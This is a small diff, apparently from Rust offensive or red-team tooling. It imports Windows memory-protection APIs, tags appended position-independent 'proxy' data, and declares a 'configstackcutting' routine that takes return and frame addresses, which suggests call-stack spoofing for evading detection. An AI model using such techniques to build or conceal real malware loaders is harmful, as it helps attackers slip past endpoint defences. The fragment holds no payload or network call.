@@ -15,7 +15,7 @@ import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationTyp
 import!(KERNEL32!VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD) -> LPVOID);
 import!(KERNEL32!GetModuleHandleA(lpModuleName: LPCSTR) -> HMODULE);
 
-append_data!(my_proxy, findAppendedPROXY);
+append_data!(my_proxy, findAppendedPROXY, "rPROXYPIC");
 
 unsafe extern "C" {
     fn configstackcutting(proxy: PROXY, retaddr: *const u8, frameaddr: *const u8);
